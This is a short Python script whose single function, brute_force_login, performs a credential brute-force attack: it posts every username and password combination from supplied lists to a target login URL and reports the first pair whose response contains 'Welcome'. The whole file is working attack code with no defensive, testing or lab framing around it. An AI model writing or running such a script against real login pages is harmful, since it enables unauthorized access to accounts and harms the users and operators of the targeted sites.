import requests

def brute_force_login(target_url, username_list, password_list):
    """Perform a brute force login attack."""
    for username in username_list:
        for password in password_list:
            payload = {
                "username": username,
                "password": password
            }
            response = requests.post(target_url, data=payload)
            if "Welcome" in response.text:  
                print(f"Login successful with username: {username} and password: {password}")
                return True
    print("Brute force failed to find valid credentials.")
    return False
